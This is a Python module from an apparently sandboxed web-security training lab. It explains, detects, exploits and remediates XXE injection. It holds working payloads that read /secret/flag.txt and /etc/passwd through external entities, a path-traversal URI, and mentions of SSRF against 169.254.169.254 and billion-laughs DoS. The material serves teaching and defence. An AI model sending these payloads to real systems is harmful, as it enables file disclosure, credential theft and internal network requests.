"""XML External Entity (XXE) injection -- detect, exploit, and remediate.

WHAT IT IS
----------
An XXE flaw is what you get when an application parses attacker-controlled XML
with a parser that *resolves external entities* and then exposes the parsed
result. XML's DOCTYPE lets a document define entities -- named placeholders the
parser expands when they are referenced. An *external* entity points at a
resource off the parser's own host::

    <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///secret/flag.txt"> ]>
    <data>&xxe;</data>

When the parser hits ``&xxe;`` it fetches whatever ``SYSTEM`` named -- here, the
*contents* of ``/secret/flag.txt`` -- and substitutes them into the document.
If the app then echoes that parsed text back (or stores/processes it anywhere
the attacker can observe), the file's contents leak. The demo app's ``/xml``
handler is the textbook shape::

    def xml(self):                              # POST /xml, body = raw XML
        content = _parse_xxe(self._body_bytes(), state.sandbox)
        return self._send(200, f"<p>Parsed note: {content}</p>")  # echoes it back

and ``_parse_xxe`` builds a SAX parser with ``feature_external_ges`` (external
*general* entities) turned **on** and an entity resolver that happily ``open()``s
``file://`` URIs. That single enabled feature is the whole vulnerability: a
benign ``<data>hello</data>`` round-trips harmlessly, but a document carrying the
DOCTYPE above coaxes the server into reading a file it never meant to expose --
and the response hands the bytes straight back. (A sandbox *jail* still confines
the read to the lab's temp tree, so a URI that over-shoots the root -- e.g.
``file:///../../../../etc/passwd`` -- is rejected with HTTP 400 and the real host
filesystem is never touched. That jail is the only thing the demo does right.)

HOW WE DISCOVER IT
------------------
We confirm the sink with a layered set of signals:

1. **Baseline parse (control).** A well-formed document with NO DOCTYPE --
   ``<data>just a harmless note</data>`` -- round-trips: the response echoes our
   literal text. That proves ``/xml`` parses XML and reflects the parsed
   character data, but on its own leaks nothing -- the precondition XXE abuses.
2. **The entity expansion.** Adding a DOCTYPE that declares an external
   ``file://`` entity *and referencing it* makes the response contain content we
   never sent in the body -- the target file's bytes. That differential (text
   that appears only when an external entity is referenced) *is* the
   vulnerability.
3. **Reference-required proof.** We also send a document that *declares* the
   external entity but never references ``&xxe;``. It leaks nothing -- proving it
   is the entity *expansion*, not merely the presence of a DOCTYPE, that performs
   the read. A clean negative that isolates the mechanism.
4. **The jail boundary (control).** A URI that over-shoots the sandbox root
   (``file:///../../../../etc/passwd``) is *rejected* (HTTP 400, "path escapes
   the lab sandbox"). A parser that "reads anything" might be a quirk; one that
   reads ``file:///secret/flag.txt`` yet is explicitly stopped when the path
   leaves the jail proves it resolves real files and that we genuinely disclosed
   one.

HOW WE EXPLOIT IT
-----------------
We POST the headline document and recover the planted ``secret/flag.txt``,
whose body is ``C.FLAGS["xxe"]`` -- proof we read a server-side file via entity
expansion. The same primitive is a *general* file-disclosure tool: we also point
it at the planted ``etc/passwd`` to show it reads more than one chosen file. In
the real world this reads source code, ``/etc/passwd``, cloud credentials,
``web.xml``/config with database secrets -- anything the parser's user can open.

BEYOND FILE READ
----------------
XXE is not only file disclosure. The same external-entity machinery enables
**SSRF** (point ``SYSTEM`` at ``http://169.254.169.254/...`` and the *parser*
makes the request from inside the network) and, via nested *internal* entities,
a **billion-laughs** denial-of-service that explodes a tiny document into
gigabytes of expansion. The fix below shuts off all three at once.

THE FIX
-------
See :data:`REMEDIATION`. In one line: parse untrusted XML with a hardened parser
that has DTD processing and external-entity / external-general-entity resolution
DISABLED (and entity-expansion limits set), so no DOCTYPE can ever make the
parser touch a file, a URL, or blow up memory.
"""
from __future__ import annotations

import os
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Parse untrusted XML with a hardened, entity-resolving-disabled parser. The "
    "root cause is a parser configured to resolve external entities: never enable "
    "that for attacker-controlled input. Concretely -- DISABLE DTD processing "
    "entirely where possible, and at minimum disable external general AND external "
    "parameter entities and the loading of external DTDs (in Python's stdlib SAX, "
    "do NOT call parser.setFeature(feature_external_ges, True) / "
    "feature_external_pes; better, use defusedxml, which ships safe defaults; in "
    "Java, set XMLConstants.FEATURE_SECURE_PROCESSING and the "
    "'disallow-doctype-decl' / external-general/parameter-entities features to "
    "false; in libxml2, do not pass NOENT/DTDLOAD/NONET). Reject documents that "
    "carry a <!DOCTYPE> at all unless you genuinely need one. This single change "
    "closes three attacks at once: (1) FILE DISCLOSURE -- the entity can no longer "
    "read file:// URIs; (2) SSRF -- the entity can no longer be pointed at "
    "http://169.254.169.254/ or other internal URLs to make the server issue "
    "requests on the attacker's behalf; and (3) the BILLION-LAUGHS / entity-"
    "expansion DoS -- so also cap entity-expansion depth and total expanded size "
    "(or forbid nested internal entities) to stop a tiny document exploding into "
    "gigabytes. Run the parser as a least-privilege user and keep secrets out of "
    "any path it could reach. Disable DTDs and external entities, prefer "
    "defusedxml, and never echo raw parsed content -- harden the parser, don't "
    "blocklist payloads."
)

#: The XXE sink, used as the Finding endpoint.
ENDPOINT: str = "/xml"

#: Content-Type the sink expects (it reads the raw request body as XML).
XML_CONTENT_TYPE: str = "application/xml"

#: The file the headline payload discloses -- the planted XXE prize.
TARGET_FILE_URI: str = "file:///secret/flag.txt"

#: A second file the same primitive can read, to show XXE is a general file-read
#: tool (this is the planted /etc/passwd decoy, also reachable via traversal).
PASSWD_FILE_URI: str = "file:///etc/passwd"

#: A URI that over-shoots the sandbox root: the jail rejects it (HTTP 400). Used
#: to prove the read is real-file resolution, not an echo quirk.
JAIL_ESCAPE_FILE_URI: str = "file:///../../../../etc/passwd"

#: A marker we expect to find in the leaked passwd file (besides any flag).
PASSWD_MARKER: str = "root:x:0:0:"

#: The benign control body: well-formed XML, NO DOCTYPE -- must leak nothing.
BENIGN_MARKER: str = "weblab-xxe-benign-probe"
BENIGN_BODY: str = f'<?xml version="1.0"?><data>{BENIGN_MARKER}</data>'

#: Where the sink wraps the parsed content in the response, so we can confirm the
#: handler actually reflected our parsed character data.
RESPONSE_PREFIX: str = "Parsed note:"


def build_payload(file_uri: str, *, root: str = "data", entity: str = "xxe") -> str:
    """Build an XXE document whose external entity reads ``file_uri``.

    Produces the classic shape::

        <?xml version="1.0"?>
        <!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///secret/flag.txt"> ]>
        <data>&xxe;</data>

    The DOCTYPE declares an *external general entity* (``SYSTEM`` + a URI) and the
    body *references* it (``&xxe;``) -- both halves are required: a declared-but-
    unreferenced entity is never expanded, so it never reads the file. When a
    vulnerable parser expands ``&xxe;`` it substitutes the contents of ``file_uri``
    into the document, and an app that echoes parsed text leaks those bytes.

    Args:
        file_uri: The resource the entity points at (e.g. ``file:///secret/flag.txt``).
        root:     The XML root element name (cosmetic; defaults to ``data``).
        entity:   The entity name (cosmetic; defaults to ``xxe``).
    """
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE {root} [ <!ENTITY {entity} SYSTEM "{file_uri}"> ]>'
        f"<{root}>&{entity};</{root}>"
    )


def build_unreferenced_payload(file_uri: str, *, root: str = "data") -> str:
    """Build a document that DECLARES the external entity but never references it.

    Used as a negative control: declaring an external entity without an ``&xxe;``
    reference must leak nothing, proving it is the entity *expansion* (the
    reference), not the bare DOCTYPE, that triggers the file read.
    """
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE {root} [ <!ENTITY xxe SYSTEM "{file_uri}"> ]>'
        f"<{root}>declared-but-unreferenced</{root}>"
    )


def _load_payloads() -> List[str]:
    """Load the XXE payload corpus from the data file (one doc per non-comment line)."""
    path = os.path.join(os.path.dirname(__file__), "data", "xxe_payloads.txt")
    payloads: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.rstrip("\n")
                if not line.strip() or line.lstrip().startswith("#"):
                    continue
                payloads.append(line)
    except OSError:
        # Fall back to the in-code essentials so the engine still works if the
        # data file is missing.
        payloads = [
            build_payload(TARGET_FILE_URI),
            build_payload(PASSWD_FILE_URI),
            BENIGN_BODY,
        ]
    return payloads


#: Every payload the engine can send (loaded once at import). Public so the CLI /
#: report can show exactly what was attempted.
PAYLOADS: List[str] = _load_payloads()


# --- low-level probe ---------------------------------------------------------
def _post_xml(client: WebClient, body: str) -> Response:
    """POST ``body`` to ``/xml`` as raw ``application/xml`` -- the XXE sink."""
    return client.post(
        ENDPOINT,
        body=body.encode("utf-8"),
        headers={"Content-Type": XML_CONTENT_TYPE},
    )


def _parsed_content(resp: Response) -> str:
    """Extract the echoed 'Parsed note: ...' content from a 200 response, else ''."""
    if resp.status != 200 or RESPONSE_PREFIX not in resp.text:
        return ""
    after = resp.text.split(RESPONSE_PREFIX, 1)[1]
    # The handler wraps content as "<p>Parsed note: CONTENT</p>".
    return after.split("</p>", 1)[0].strip()


# --- detection ---------------------------------------------------------------
def detect_baseline_parse(client: WebClient) -> Tuple[bool, str]:
    """True if a benign (no-DOCTYPE) document round-trips -- proves it's an XML sink.

    POSTs ``<data>...</data>`` with no DOCTYPE. A 200 echoing our literal marker
    proves ``/xml`` parses XML and reflects the parsed character data -- the
    precondition XXE abuses -- while leaking nothing on its own (the control).
    """
    resp = _post_xml(client, BENIGN_BODY)
    content = _parsed_content(resp)
    if content and BENIGN_MARKER in content:
        return True, (
            f"POST {ENDPOINT} with a benign no-DOCTYPE document echoed our text "
            f"back (HTTP {resp.status}, 'Parsed note: ...') -- the endpoint parses "
            "XML and reflects parsed character data, but leaks nothing on its own"
        )
    return False, ""


def detect_external_entity(client: WebClient) -> Tuple[bool, str]:
    """True if a referenced external ``file://`` entity expands into the response.

    POSTs the headline DOCTYPE+``&xxe;`` document pointing at the secret file. A
    response containing content we never sent in the body -- the file's bytes --
    proves the parser resolved an external entity and disclosed a server-side file.
    """
    resp = _post_xml(client, build_payload(TARGET_FILE_URI))
    content = _parsed_content(resp)
    if content and C.FLAGS["xxe"] in content:
        return True, (
            f"POST {ENDPOINT} with a DOCTYPE external entity (SYSTEM "
            f"{TARGET_FILE_URI!r}) expanded into the response (HTTP {resp.status}) "
            f"-- the echoed 'Parsed note' carries {C.FLAGS['xxe']!r}, content never "
            "present in the request body, proving an external file was read"
        )
    return False, ""


def detect_reference_required(client: WebClient) -> Tuple[bool, str]:
    """True if a DECLARED-but-UNREFERENCED external entity leaks nothing (control).

    POSTs a document that declares the external entity yet never references
    ``&xxe;``. Leaking nothing proves it is the entity *expansion*, not the bare
    DOCTYPE, that performs the read -- isolating the mechanism.
    """
    resp = _post_xml(client, build_unreferenced_payload(TARGET_FILE_URI))
    content = _parsed_content(resp)
    leaked = bool(content) and C.FLAGS["xxe"] in content
    if resp.status == 200 and not leaked:
        return True, (
            f"POST {ENDPOINT} with the external entity DECLARED but never "
            f"referenced leaked no file content (HTTP {resp.status}) -- proves the "
            "entity *reference* (&xxe;), not the bare DOCTYPE, triggers the read"
        )
    return False, ""


def detect_jail_boundary(client: WebClient) -> Tuple[bool, str]:
    """Confirm the jail rejects an over-shooting file URI (HTTP 400) -- the control.

    POSTs an entity pointing at ``file:///../../../../etc/passwd``, which escapes
    the sandbox root. A 400 ("path escapes the lab sandbox") proves the resolver
    opens *real* files and a boundary held -- so the successful in-jail read was a
    genuine disclosure, not an echo quirk.
    """
    resp = _post_xml(client, build_payload(JAIL_ESCAPE_FILE_URI))
    if resp.status == 400 and "escapes" in resp.text.lower():
        return True, (
            f"POST {ENDPOINT} with SYSTEM {JAIL_ESCAPE_FILE_URI!r} over-shot the "
            f"sandbox root and was rejected (HTTP {resp.status}, 'path escapes the "
            "lab sandbox') -- the resolver opens real files, so the in-jail read "
            "was genuine file disclosure"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_file(
    client: WebClient, file_uri: str = TARGET_FILE_URI
) -> Tuple[bool, Optional[str], str]:
    """Read ``file_uri`` via an external-entity expansion and return its contents.

    Returns ``(ok, flag, contents)``. For the default target the leaked content is
    ``C.FLAGS["xxe"]`` -- proof we read a server-side file. ``flag`` is set only
    when the planted XXE flag is present; ``contents`` is the raw parsed text
    either way (so reading e.g. the passwd decoy still returns its body).
    """
    resp = _post_xml(client, build_payload(file_uri))
    content = _parsed_content(resp)
    if not content:
        return False, None, resp.text
    flag = C.FLAGS["xxe"] if C.FLAGS["xxe"] in content else None
    return flag is not None, flag, content


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect XXE, then exploit it (read ``file:///secret/flag.txt``).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["xxe"]`` and whose ``extra`` records the supporting proofs (the
    reference-required control and the jail boundary that returns 400). Also
    demonstrates the same primitive reading the planted ``/etc/passwd``.
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    baseline_ok, baseline_ev = detect_baseline_parse(client)
    if baseline_ok:
        techniques.append("baseline-parse")
    entity_ok, entity_ev = detect_external_entity(client)
    if entity_ok:
        techniques.append("external-entity-expansion")
    refreq_ok, refreq_ev = detect_reference_required(client)
    if refreq_ok:
        techniques.append("reference-required-control")
    jail_ok, jail_ev = detect_jail_boundary(client)
    if jail_ok:
        techniques.append("jail-boundary-400")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, leaked = exploit_read_file(client)
    if ok:
        techniques.append("read-secret-flag")

    # Bonus: show XXE is a general file-read primitive (read the passwd decoy).
    passwd_ok, _passwd_flag, passwd_contents = exploit_read_file(
        client, file_uri=PASSWD_FILE_URI
    )
    if passwd_ok or PASSWD_MARKER in passwd_contents:
        techniques.append("read-etc-passwd")

    # Discovery requires both the entity-expansion signal AND a recovered flag.
    discovered = bool(entity_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if baseline_ok:
        evidence_parts.append(f"baseline: {baseline_ev}")
    if entity_ok:
        evidence_parts.append(f"entity: {entity_ev}")
    if refreq_ok:
        evidence_parts.append(f"reference-control: {refreq_ev}")
    if jail_ok:
        evidence_parts.append(f"jail: {jail_ev}")
    evidence = " || ".join(evidence_parts)

    working_payload = build_payload(TARGET_FILE_URI)

    exploit_result = {
        "flag": flag,
        "payload": working_payload,
        "target_file": TARGET_FILE_URI,
        "leaked_contents": leaked,
        "also_read": {
            "file": PASSWD_FILE_URI,
            "leaked_contents": passwd_contents if passwd_ok or PASSWD_MARKER in passwd_contents else "",
        },
        "techniques": techniques,
        "summary": (
            f"POST {ENDPOINT} with a DOCTYPE external entity (SYSTEM "
            f"{TARGET_FILE_URI!r}) read a server-side file; recovered flag {flag!r}"
        ),
    }

    return Finding(
        vuln="XML External Entity (XXE) Injection",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=working_payload,
        extra={
            "techniques": techniques,
            "target_file_uri": TARGET_FILE_URI,
            "passwd_file_uri": PASSWD_FILE_URI,
            "working_payload": working_payload,
            "baseline_parse_ok": baseline_ok,
            "external_entity_detected": entity_ok,
            "reference_required_control": refreq_ok,
            # The jail boundary: an over-shooting file URI is forbidden (400).
            "jail_escape_file_uri": JAIL_ESCAPE_FILE_URI,
            "jail_escape_status": 400,
            "jail_enforced": jail_ok,
            "flag_recovered": ok,
            "etc_passwd_readable": passwd_ok or PASSWD_MARKER in passwd_contents,
            # XXE is more than file read -- note the escalation classes for reports.
            "related_attacks": ["SSRF via XXE", "billion-laughs entity-expansion DoS"],
        },
    )
